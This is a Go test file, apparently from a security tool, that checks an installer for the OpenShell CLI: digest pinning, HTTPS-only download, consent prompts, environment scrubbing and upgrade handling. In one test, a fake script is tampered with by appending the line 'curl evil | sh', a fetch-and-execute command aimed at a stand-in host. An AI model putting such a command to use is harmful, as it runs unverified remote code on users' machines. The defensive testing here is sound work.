// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package openshell_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/openshell"
	"github.com/defenseclaw/defenseclaw/internal/openshell/openshelltest"
)

const fakeScript = "#!/bin/sh\necho installing openshell\n"

type installFixture struct {
	t        *testing.T
	srv      *httptest.Server
	hits     atomic.Int32
	runner   *openshelltest.Runner
	cliPath  string
	tempDir  string
	out      bytes.Buffer
	verified int
	inst     *openshell.Installer
	// scriptSeen is the script content and mode observed while the
	// installer ran.
	scriptSeen []byte
	scriptMode os.FileMode
}

func sha(b string) string {
	sum := sha256.Sum256([]byte(b))
	return hex.EncodeToString(sum[:])
}

// newInstallFixture serves body as the installer and scripts a machine on
// which the CLI reports existing (empty: not installed) before the
// install and after (empty: still not installed) once the script ran.
func newInstallFixture(t *testing.T, body, existing, after string) *installFixture {
	t.Helper()
	skipOnWindows(t)
	f := &installFixture{t: t, runner: &openshelltest.Runner{}}
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		if r.URL.Path != "/NVIDIA/OpenShell/v0.1.1/install.sh" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(f.srv.Close)
	f.cliPath = filepath.Join(t.TempDir(), "openshell")
	f.tempDir = t.TempDir()
	version := existing
	if existing != "" {
		writeExecutable(t, f.cliPath)
	}
	f.runner.OnFunc(f.cliPath+" --version", func(context.Context, openshell.Command) ([]byte, error) {
		return []byte(version + "\n"), nil
	})
	f.runner.OnFunc("/bin/sh", func(_ context.Context, c openshell.Command) ([]byte, error) {
		path := c.Args[0]
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("script missing while the installer runs: %v", err)
		}
		info, _ := os.Stat(path)
		f.scriptSeen, f.scriptMode = data, info.Mode().Perm()
		if after != "" {
			writeExecutable(t, f.cliPath)
			version = after
		}
		return nil, nil
	})
	f.inst = &openshell.Installer{
		HTTPClient: f.srv.Client(),
		URL:        f.srv.URL + "/NVIDIA/OpenShell/v0.1.1/install.sh",
		SHA256:     sha(body),
		Release:    "v0.1.1",
		TempDir:    f.tempDir,
		Runner:     f.runner,
		LookPath:   func(string) (string, error) { return "", errors.New("not on PATH") },
		Candidates: []string{f.cliPath},
		PackageCLI: f.cliPath,
		Out:        &f.out,
		Consent: func(p *openshell.InstallPlan) (bool, error) {
			if !strings.Contains(f.out.String(), p.SHA256) {
				t.Errorf("plan was not printed before consent:\n%s", f.out.String())
			}
			return true, nil
		},
		VerifyGateway: func(context.Context) error { f.verified++; return nil },
	}
	return f
}

func writeExecutable(t *testing.T, path string) {
	t.Helper()
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

func (f *installFixture) ran() bool { return f.runner.Called("/bin/sh") }

// scriptRun returns the installer command, run through /bin/sh.
func (f *installFixture) scriptRun() openshell.Command {
	for _, c := range f.runner.Calls() {
		if c.Name == "/bin/sh" {
			return c
		}
	}
	f.t.Fatal("the installer did not run")
	return openshell.Command{}
}

func (f *installFixture) assertNoLeftovers() {
	f.t.Helper()
	if entries, err := os.ReadDir(f.tempDir); err != nil || len(entries) != 0 {
		f.t.Fatalf("installer left files behind in %s: %v, %v", f.tempDir, entries, err)
	}
}

func TestInstallFresh(t *testing.T) {
	// Inherited variables the pinned script reads: the release, the
	// method, the CLI it registers the gateway with, a test switch that
	// makes it a no-op.
	inherited := []string{"OPENSHELL_VERSION", "OPENSHELL_ACK_BREAKING_UPGRADE", "OPENSHELL_INSTALL_METHOD", "OPENSHELL_REGISTER_BIN",
		"OPENSHELL_INSTALL_SH_TEST", "OPENSHELL_TEST_LDD_OUTPUT", "OPENSHELL_SNAP_TLS_DIR"}
	for _, v := range inherited {
		t.Setenv(v, "inherited")
	}
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	res, err := f.inst.Install(context.Background())
	if err != nil || !res.Installed || res.CLIVersion.String() != "0.1.1" || f.verified != 1 {
		t.Fatalf("Install = %+v, %v (gateway verified %d times)", res, err, f.verified)
	}
	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
	}
	run := f.scriptRun()
	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=v0.1.1", "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
		t.Fatalf("installer env = %v", run.Env)
	}
	for _, v := range inherited {
		if !slices.Contains(run.Unset, v) {
			t.Errorf("inherited %s is not dropped: %v", v, run.Unset)
		}
	}
	plan := f.out.String()
	for _, want := range []string{"v0.1.1", f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=v0.1.1 OPENSHELL_REGISTER_BIN=" + f.cliPath + " /bin/sh "} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if strings.Contains(plan, "ACK_BREAKING") {
		t.Errorf("fresh install plan acknowledges a breaking upgrade:\n%s", plan)
	}
	f.assertNoLeftovers()
}

func TestInstallRefusesDigestMismatch(t *testing.T) {
	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell 0.1.1")
	f.inst.SHA256 = sha(fakeScript)
	consented := false
	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
	_, err := f.inst.Install(context.Background())
	var mismatch *openshell.DigestMismatchError
	if !errors.Is(err, openshell.ErrDigestMismatch) || !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
		t.Fatalf("Install = %v (%+v), want ErrDigestMismatch", err, mismatch)
	}
	if consented || f.ran() || f.out.Len() != 0 {
		t.Fatalf("a mismatched script reached consent=%v run=%v plan=%q", consented, f.ran(), f.out.String())
	}
	f.assertNoLeftovers()
}

// TestInstallRefusals covers installs that stop before the script runs.
func TestInstallRefusals(t *testing.T) {
	for _, tc := range []struct {
		name    string
		mutate  func(f *installFixture)
		wantIs  error
		wantErr string
	}{
		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, nil, "must be https"},
		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, nil, "HTTP 404"},
		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, nil, "exceeds 8 bytes"},
		{"declined", func(f *installFixture) {
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
		}, openshell.ErrInstallDeclined, ""},
		// Without a consent callback nothing is even downloaded.
		{"no consent callback", func(f *installFixture) { f.inst.Consent = nil }, nil, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			tc.mutate(f)
			_, err := f.inst.Install(context.Background())
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || (tc.wantIs != nil && !errors.Is(err, tc.wantIs)) {
				t.Fatalf("Install = %v, want %q (%v)", err, tc.wantErr, tc.wantIs)
			}
			if f.ran() || (f.inst.Consent == nil && f.hits.Load() != 0) {
				t.Fatalf("installer ran %v after %d downloads", f.ran(), f.hits.Load())
			}
			f.assertNoLeftovers()
		})
	}
}

func TestInstallExistingReleases(t *testing.T) {
	for _, tc := range []struct {
		name, existing string
		installed      bool
		unsupported    bool
		downloads      int32
	}{
		{name: "supported is kept", existing: "openshell 0.1.3"},
		{name: "newer minor refused", existing: "openshell 0.2.0", unsupported: true},
		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
		// As doctor advises: 0.0.37 and later need no cleanup.
		{name: "0.0.40 upgraded in place", existing: "openshell 0.0.40", installed: true, downloads: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, tc.existing, "openshell 0.1.1")
			res, err := f.inst.Install(context.Background())
			var u *openshell.ErrUnsupportedVersion
			if tc.unsupported != errors.As(err, &u) || (!tc.unsupported && (err != nil || res.Installed != tc.installed)) {
				t.Fatalf("Install = %+v, %v", res, err)
			}
			if got := f.hits.Load(); got != tc.downloads {
				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
			}
			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed "+tc.existing+" to v0.1.1 in place") {
				t.Fatalf("plan lacks the in-place note:\n%s", f.out.String())
			}
			if strings.Contains(f.out.String(), "ACK_BREAKING") {
				t.Fatalf("an in-place upgrade acknowledges a breaking one:\n%s", f.out.String())
			}
		})
	}
}

func TestInstallBreakingUpgrade(t *testing.T) {
	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
		t.Run(existing, func(t *testing.T) {
			// No confirmation callback: refused, with the cleanup explained.
			f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() ||
				!strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
				t.Fatalf("Install = %v (ran %v), plan:\n%s", err, f.ran(), f.out.String())
			}
			f.assertNoLeftovers()

			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
				t.Fatalf("declined: Install = %v (ran %v)", err, f.ran())
			}

			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
			var confirmed *openshell.InstallPlan
			f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
			if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || confirmed == nil || !confirmed.BreakingUpgrade {
				t.Fatalf("confirmed: Install = %+v, %v (plan %+v)", res, err, confirmed)
			}
			if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
				t.Fatalf("installer env = %v", env)
			}
		})
	}
}

// TestInstallReplacesLegacyCLI covers a pre-0.0.37 CLI in ~/.local/bin,
// which comes before the package's CLI on PATH and which the package does
// not replace: the plan says to remove it, the script registers the
// gateway with the package's CLI, and an install that leaves the old CLI
// first on PATH is reported, not passed.
func TestInstallReplacesLegacyCLI(t *testing.T) {
	setup := func(t *testing.T) (*installFixture, string) {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		legacy := filepath.Join(t.TempDir(), "openshell")
		writeExecutable(t, legacy)
		f.runner.On(legacy+" --version", "openshell 0.0.36\n", nil)
		f.inst.LookPath = func(string) (string, error) {
			if _, err := os.Stat(legacy); err != nil {
				return "", err
			}
			return legacy, nil
		}
		f.inst.Candidates = []string{legacy, f.cliPath}
		f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { return true, nil }
		return f, legacy
	}
	t.Run("left in place", func(t *testing.T) {
		f, legacy := setup(t)
		_, err := f.inst.Install(context.Background())
		if !errors.Is(err, openshell.ErrStaleCLI) || !strings.Contains(err.Error(), "rm "+legacy) || !strings.Contains(err.Error(), "installed at "+f.cliPath) {
			t.Fatalf("Install = %v", err)
		}
		if !strings.Contains(f.out.String(), "then remove the old CLI") || !strings.Contains(f.out.String(), "    rm "+legacy) {
			t.Fatalf("plan does not say to remove the old CLI:\n%s", f.out.String())
		}
		if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_REGISTER_BIN="+f.cliPath) {
			t.Fatalf("installer registers the gateway with PATH's CLI: env %v", env)
		}
	})
	t.Run("removed as the plan says", func(t *testing.T) {
		f, legacy := setup(t)
		f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return true, os.Remove(legacy) }
		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != "0.1.1" {
			t.Fatalf("Install = %+v, %v", res, err)
		}
	})
}

// TestInstallNeverRunsRelativeCandidates covers a fresh install (no CLI on
// PATH) from a directory holding .local/bin/openshell: with HOME unset or
// relative the default home candidate would name that file, and the
// installer would run it as the existing CLI.
func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
	for _, tc := range []struct {
		name, home string
		candidates []string
	}{
		{name: "HOME unset", home: ""},
		{name: "HOME relative", home: "relhome"},
		{name: "relative candidate", home: "/nonexistent-home", candidates: []string{filepath.Join(".local", "bin", "openshell")}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			work := t.TempDir()
			for _, dir := range []string{work, filepath.Join(work, "relhome")} {
				if err := os.MkdirAll(filepath.Join(dir, ".local", "bin"), 0o755); err != nil {
					t.Fatal(err)
				}
				writeExecutable(t, filepath.Join(dir, ".local", "bin", "openshell"))
			}
			t.Chdir(work)
			t.Setenv("HOME", tc.home)
			f.inst.Candidates = tc.candidates
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			_, _ = f.inst.Install(context.Background())
			for _, c := range f.runner.Calls() {
				if !filepath.IsAbs(c.Name) {
					t.Fatalf("installer ran %q, a path relative to the working directory", c.Name)
				}
			}
		})
	}
	t.Run("absolute HOME still probed", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "")
		home := t.TempDir()
		cli := filepath.Join(home, ".local", "bin", "openshell")
		if err := os.MkdirAll(filepath.Dir(cli), 0o755); err != nil {
			t.Fatal(err)
		}
		writeExecutable(t, cli)
		f.runner.On(cli+" --version", "openshell 0.1.1\n", nil)
		t.Setenv("HOME", home)
		f.inst.Candidates = nil
		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
			t.Fatalf("Install = %+v, %v; want the CLI in the home directory found", res, err)
		}
	})
}

func TestInstallVerifiesOutcome(t *testing.T) {
	for _, tc := range []struct {
		name, after string
		mutate      func(f *installFixture)
		wantErr     string
	}{
		{"cli still old", "openshell 0.0.40", nil, "0.0.40"},
		{"no cli after install", "", nil, "no openshell CLI"},
		{"gateway unhealthy", "openshell 0.1.1", func(f *installFixture) {
			f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
		}, "gateway is not healthy"},
		{"installer fails", "openshell 0.1.1", func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", tc.after)
			if tc.mutate != nil {
				tc.mutate(f)
			}
			if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("Install = %v, want %q", err, tc.wantErr)
			}
			f.assertNoLeftovers()
		})
	}
}
